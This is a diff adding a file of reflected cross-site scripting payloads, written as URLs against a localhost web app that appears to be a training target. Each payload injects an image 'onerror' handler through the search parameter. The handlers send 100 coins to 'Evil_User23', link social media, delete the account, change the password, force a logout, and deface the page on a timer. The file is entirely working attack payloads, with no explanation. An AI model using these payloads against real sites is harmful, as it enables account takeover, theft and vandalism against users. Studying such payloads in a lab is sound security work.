@@ -1,0 +1,17 @@
+Send Coins:
+http://localhost:8080/?search=action+games+<img+src="notimage"+onerror="{document.getElementById('send_to_user').value='Evil_User23';document.getElementById('num_coins').value=100;sendCoins();}">
+
+Link Social Media:
+http://localhost:8080/?search=<img src="notimage" onerror="linkSocialMedia();">
+
+Delete Account:
+http://localhost:8080/?search=<img src="notimage" onerror="deleteAccount();">
+
+Change Password:
+http://localhost:8080/?search=<img src="notimage" onerror="changePassword();">
+
+Force Logout:
+http://localhost:8080/?search=<img src="notimage" onerror="logout();">
+
+setInterval DOM Injection:
+http://localhost:8080/?search=<img src="notimage" onerror="{let i=[0];setInterval(()=>{document.getElementById('search_string').innerHTML='<br/>youve been h@cked'.repeat(i.length);i.push(Math.random());},1000)}">
